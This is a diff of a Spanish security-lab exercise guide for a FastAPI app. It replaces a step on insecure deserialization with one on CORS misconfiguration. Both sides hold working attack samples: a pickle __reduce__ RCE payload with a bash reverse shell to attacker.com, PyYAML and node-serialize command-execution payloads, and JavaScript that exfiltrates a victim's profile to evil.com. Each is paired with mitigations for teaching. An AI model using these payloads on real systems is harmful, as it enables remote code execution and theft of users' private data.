@@ -1,210 +1,187 @@
-# Paso 4 — Insecure Deserialization
-**Tecnologia:** Python / FastAPI | **OWASP:** A08:2021 - Software and Data Integrity Failures | **CWE-502**
+# Paso 5 — CORS Misconfiguration
+**Tecnologia:** Python / FastAPI | **OWASP:** A05:2021 - Security Misconfiguration | **CWE-942**
 
 ---
 
 ## Que es esta vulnerabilidad?
 
-Insecure Deserialization ocurre cuando una aplicacion deserializa datos de una fuente no confiable usando un formato que permite ejecucion de codigo o manipulacion arbitraria de objetos. No se trata de que los datos sean incorrectos en formato — se trata de que el propio proceso de deserializacion ejecuta codigo que el atacante controla.
+Cross-Origin Resource Sharing (CORS) es el mecanismo por el que un servidor declara que origenes externos pueden leer sus respuestas desde un navegador. Una mala configuracion CORS no afecta a peticiones directas con curl o Postman; solo importa en el contexto del navegador, donde la politica Same-Origin normalmente bloquearia las peticiones cross-origin.
 
-`pickle` de Python es el ejemplo canonico: el formato no solo guarda datos, tambien guarda instrucciones de reconstruccion de objetos. Al deserializar, Python ejecuta esas instrucciones. Un atacante puede construir un payload que al deserializarse ejecute cualquier comando del sistema, sin importar que validacion se haga despues.
+La combinacion `allow_origins=["*"]` con `allow_credentials=True` es la configuracion mas peligrosa: indica al navegador que cualquier dominio puede hacer peticiones autenticadas (con cookies de sesion) y leer las respuestas. Un sitio malicioso puede aprovechar esto para extraer datos privados del usuario mientras este navega.
 
-Esta vulnerabilidad es critica porque es dificil de detectar visualmente (los datos parecen una cadena base64 inofensiva) y el impacto es maximo: RCE con los privilegios del proceso servidor. Fue la causa raiz de breaches masivos en Jenkins, WebLogic y JBoss.
+La especificacion CORS prohibe esta combinacion y los navegadores modernos la rechazan generando un error. Sin embargo, muchos desarrolladores "resuelven" el error reflejando el origen de la peticion sin validarlo, lo que es igualmente peligroso y mucho mas dificil de detectar.
 
 ---
 
 ## Donde ocurre en este codigo?
 
-**Archivo:** `src/python/routes/serialize.py`
+**Archivo:** `src/python/routes/cors.py`
 
 ```python
 # CODIGO VULNERABLE — estado actual del ejercicio
-import base64
-import pickle
-
-@router.post("/load-prefs")
-async def load_prefs(data: str):
-    prefs = pickle.loads(base64.b64decode(data))  # ejecuta codigo arbitrario
-    return prefs
+def configure_cors(app: FastAPI) -> None:
+    app.add_middleware(
+        CORSMiddleware,
+        allow_origins=["*"],     # cualquier origen puede hacer peticiones
+        allow_credentials=True,  # con cookies de sesion incluidas
+        allow_methods=["*"],
+        allow_headers=["*"],
+    )
 ```
 
-El problema es `pickle.loads()` sobre datos controlados por el usuario. No importa cuanta validacion se haga despues: la ejecucion de codigo ocurre durante la propia llamada a `pickle.loads()`, antes de cualquier comprobacion de tipos o estructura. Base64 solo es encoding, no proteccion.
+Con esta configuracion, cuando `evil.com` hace una peticion a la API con credenciales, el servidor responde con `Access-Control-Allow-Origin: *` y `Access-Control-Allow-Credentials: true`. El navegador permite que el script de `evil.com` lea la respuesta completa, incluyendo datos privados del usuario autenticado.
 
 ---
 
 ## Como lo explotaria un atacante
 
-**Paso 1: Generar el payload malicioso:**
-```python
-import pickle, base64, os
+**Escenario:** la victima esta autenticada en `api.empresa.com`. Un atacante la atrae a `evil.com`:
 
-class RCE:
-    def __reduce__(self):
-        return (os.system, ("id > /tmp/rce.txt",))
-
-payload = base64.b64encode(pickle.dumps(RCE())).decode()
-print(payload)  # cadena base64 lista para enviar
+```html
+<!-- Codigo en evil.com que roba datos de la API -->
+<script>
+fetch('https://api.empresa.com/api/user/profile', {
+    credentials: 'include'  // incluye las cookies de sesion de la victima
+})
+.then(r => r.json())
+.then(data => {
+    // el atacante recibe nombre, email, datos de pago de la victima
+    fetch('https://evil.com/collect?d=' + btoa(JSON.stringify(data)));
+});
+</script>
 ```
 
-**Paso 2: Enviar el payload:**
-```
-POST /load-prefs
-Content-Type: application/x-www-form-urlencoded
-
-data=gASVLQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBJpZCA+IC90bXAvcmNlLnR4dJSFlFKULg==
-```
-
-Al ejecutar `pickle.loads()`, Python corre `os.system("id > /tmp/rce.txt")` antes de devolver ningun resultado. El archivo `/tmp/rce.txt` contendra la salida del comando.
-
-**Escalada a reverse shell:**
-```python
-class RCE:
-    def __reduce__(self):
-        cmd = "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
-        return (os.system, (cmd,))
-```
+Con la configuracion vulnerable, el servidor responde con los datos y el navegador permite que `evil.com` los lea. El atacante recibe los datos privados sin que la victima lo note.
 
 ---
 
 ## Tu tarea: aplicar la mitigacion
 
-Modifica `src/python/routes/serialize.py` para usar JSON con un modelo validado:
+Modifica `src/python/routes/cors.py` para usar una lista explicita de origenes cargada desde variables de entorno:
 
 ```python
 # CODIGO SEGURO
-import json
-from fastapi import APIRouter, HTTPException
-from pydantic import BaseModel, ValidationError
+import os
+from fastapi import FastAPI
+from fastapi.middleware.cors import CORSMiddleware
 
-router = APIRouter()
+ALLOWED_ORIGINS = [
+    origin.strip()
+    for origin in os.environ.get("CORS_ALLOWED_ORIGINS", "https://app.empresa.com").split(",")
+    if origin.strip()
+]
 
-class UserPreferences(BaseModel):
-    theme: str
-    language: str
-    notifications: bool
-
-@router.post("/load-prefs")
-async def load_prefs(data: str):
-    try:
-        raw = json.loads(data)
-        validated = UserPreferences(**raw)
-    except (json.JSONDecodeError, ValidationError) as e:
-        raise HTTPException(status_code=400, detail="Datos invalidos")
-    return validated.model_dump()
+def configure_cors(app: FastAPI) -> None:
+    app.add_middleware(
+        CORSMiddleware,
+        allow_origins=ALLOWED_ORIGINS,             # lista explicita, no wildcard
+        allow_credentials=True,
+        allow_methods=["GET", "POST", "PUT", "DELETE"],
+        allow_headers=["Authorization", "Content-Type"],
+    )
 ```
 
 ### Por que funciona esta mitigacion?
 
-- **JSON en lugar de pickle:** JSON es un formato de datos puro. No tiene instrucciones de reconstruccion de objetos ni mecanismos de ejecucion de codigo. `json.loads()` no puede ejecutar codigo Python arbitrario bajo ninguna circunstancia.
-- **Modelo Pydantic (`UserPreferences`):** define el esquema esperado. Si el JSON contiene campos extra o tipos incorrectos, `ValidationError` es lanzado antes de que los datos lleguen a la logica de negocio.
-- **`model_dump()`:** serializa solo los campos definidos en el modelo, evitando que campos no esperados pasen a traves aunque lleguen en el JSON.
-- **Regla general:** nunca usar `pickle`, `marshal` o `shelve` con datos externos. Incluso con firma HMAC del payload, el riesgo es alto porque la clave de firma puede ser comprometida.
+- **Lista explicita de origenes:** el middleware verifica que el encabezado `Origin` de la peticion coincide con uno de los origenes permitidos. Si `evil.com` no esta en la lista, el servidor no incluye `Access-Control-Allow-Origin` y el navegador bloquea la lectura de la respuesta.
+- **Variables de entorno:** los origenes permitidos cambian entre entornos. Cargarlos desde entorno evita hardcodear URLs y permite gestion correcta en CI/CD.
+- **`allow_methods` y `allow_headers` explicitos:** en lugar de `["*"]`, reduce la superficie especificando exactamente que metodos y headers son necesarios para la aplicacion.
 
 ---
 
-## Variantes de la misma categoria (Software and Data Integrity — mas complejas)
+## Variantes de la misma categoria (Security Misconfiguration — mas complejas)
 
-### Variante A: PyYAML `yaml.load()` sin Loader seguro
+### Variante A: Origin Reflection sin validacion (wildcard dinamico)
+
+Una solucion incorrecta al error de `*` + `credentials` es reflejar automaticamente el origen de la peticion:
 
 ```python
-# VULNERABLE — yaml.load() sin Loader ejecuta constructores Python
-import yaml
-
-@router.post("/config")
-async def load_config(data: str):
-    config = yaml.load(data)  # ejecuta codigo YAML arbitrario
-    return config
+# VULNERABLE — refleja el Origin sin validar (equivale a allow_origins=["*"])
+@app.middleware("http")
+async def cors_middleware(request: Request, call_next):
+    response = await call_next(request)
+    origin = request.headers.get("Origin", "")
+    # reflejo sin validar: cualquier origen recibira su nombre como permitido
+    response.headers["Access-Control-Allow-Origin"] = origin
+    response.headers["Access-Control-Allow-Credentials"] = "true"
+    return response
 ```
 
-Payload YAML malicioso que ejecuta un comando:
-```yaml
-!!python/object/apply:os.system
-- "id > /tmp/rce.txt"
+Este patron es funcionalmente equivalente a `allow_origins=["*"]` + `credentials=True` pero pasa desapercibido en revisiones de codigo.
+
+```python
+# SEGURO — reflejar solo si el origen esta en la allowlist
+ALLOWED_ORIGINS = set(os.environ.get("CORS_ALLOWED_ORIGINS", "").split(","))
+
+@app.middleware("http")
+async def cors_middleware(request: Request, call_next):
+    response = await call_next(request)
+    origin = request.headers.get("Origin", "")
+    if origin in ALLOWED_ORIGINS:
+        response.headers["Access-Control-Allow-Origin"] = origin
+        response.headers["Access-Control-Allow-Credentials"] = "true"
+    return response
+```
+
+---
+
+### Variante B: Validacion CORS por sufijo — bypass por subdominio
+
+```python
+# VULNERABLE — validacion por sufijo permite bypass
+def is_allowed_origin(origin: str) -> bool:
+    return origin.endswith(".empresa.com")  # solo comprueba sufijo
+```
+
+Bypass: el atacante registra `evil.empresa.com` (si el DNS lo permite) o `evilempresa.com` que tambien termina en `empresa.com` si no se ancla el punto. Tambien `https://evil.com?x=.empresa.com` puede pasar si la validacion no es rigurosa.
+
+```python
+# SEGURO — comparacion exacta contra allowlist normalizada
+ALLOWED_ORIGINS = {
+    "https://app.empresa.com",
+    "https://admin.empresa.com",
+}
+
+def is_allowed_origin(origin: str) -> bool:
+    return origin in ALLOWED_ORIGINS  # comparacion exacta de string completo
+```
+
+---
+
+### Variante C: CORS con origen `null` (iframes sandboxed)
+
+```python
+# VULNERABLE — aceptar null como origen valido
+ALLOWED_ORIGINS = ["https://app.empresa.com", "null"]
+```
+
+El origen `null` lo envian los navegadores cuando la peticion viene de un archivo local (`file://`), un iframe sandboxed (`<iframe sandbox>`) o ciertos redirects. Un atacante puede forzar `Origin: null` usando:
+
+```html
+<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://api.empresa.com/data',{credentials:'include'}).then(r=>r.json()).then(d=>parent.postMessage(d,'*'))</script>">
+</iframe>
 ```
 
 ```python
-# SEGURO — SafeLoader deserializa solo tipos basicos
-import yaml
-
-@router.post("/config")
-async def load_config(data: str):
-    config = yaml.safe_load(data)  # solo dict, list, str, int, float, bool
-    return config
-```
-
-`yaml.safe_load()` rechaza cualquier tag `!!python/...` lanzando `yaml.constructor.ConstructorError`.
-
----
-
-### Variante B: Java ObjectInputStream con gadget chains
-
-```java
-// VULNERABLE — deserializacion directa desde input de usuario
-@PostMapping("/restore")
-public ResponseEntity<?> restore(@RequestBody byte[] data) throws Exception {
-    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
-    Object obj = ois.readObject();  // puede activar gadget chains del classpath
-    return ResponseEntity.ok(obj.toString());
-}
-```
-
-Con librerias como `commons-collections` en el classpath, existen "gadget chains" que producen RCE al deserializar objetos Java aparentemente normales. Esta fue la base de CVE-2015-4852 (WebLogic), CVE-2017-10271 (WebLogic) y el vector principal del ataque a Jenkins.
-
-```java
-// SEGURO — usar Jackson con tipo explicito definido
-@PostMapping("/restore")
-public ResponseEntity<UserPreferences> restore(@RequestBody String json) throws Exception {
-    UserPreferences prefs = objectMapper.readValue(json, UserPreferences.class);
-    return ResponseEntity.ok(prefs);
-}
-```
-
----
-
-### Variante C: Node.js `node-serialize` con ejecucion de IIFE
-
-```javascript
-// VULNERABLE — node-serialize permite funciones en el JSON serializado
-const serialize = require('node-serialize');
-
-app.post('/restore', (req, res) => {
-    const obj = serialize.unserialize(req.body.data);  // ejecuta funciones
-    res.json(obj);
-});
-```
-
-Payload donde el sufijo `()` convierte la funcion en IIFE que se ejecuta inmediatamente:
-```json
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,o){console.log(o)});}()"}
-```
-
-```javascript
-// SEGURO — JSON.parse con validacion de esquema
-const Joi = require('joi');
-const schema = Joi.object({ theme: Joi.string(), lang: Joi.string() });
-
-app.post('/restore', (req, res) => {
-    const raw = JSON.parse(req.body.data);  // JSON puro, sin ejecucion de funciones
-    const { error, value } = schema.validate(raw);
-    if (error) return res.status(400).json({ error: 'Datos invalidos' });
-    res.json(value);
-});
+# SEGURO — nunca incluir null en la allowlist
+ALLOWED_ORIGINS = ["https://app.empresa.com"]
+# null no es un origen legitimo para APIs web
 ```
 
 ---
 
 ## Referencias
 
-- [OWASP A08:2021 - Software and Data Integrity Failures](https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/)
-- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
-- [PortSwigger - Insecure deserialization](https://portswigger.net/web-security/deserialization)
-- [CVE-2015-4852 — Apache Commons Collections gadget chain](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4852)
+- [OWASP A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
+- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
+- [PortSwigger - CORS misconfiguration](https://portswigger.net/web-security/cors)
+- [Mozilla MDN - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
 
 ---
 
 ## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 04** exige que `src/python/routes/serialize.py` contenga:
-- `json.loads`
-- `UserPreferences`
-- La ausencia de `pickle.loads`
+El workflow **Validate Step 05** exige que `src/python/routes/cors.py` contenga:
+- `ALLOWED_ORIGINS`
+- `os.environ.get`
+- La ausencia de `allow_origins=["*"]`
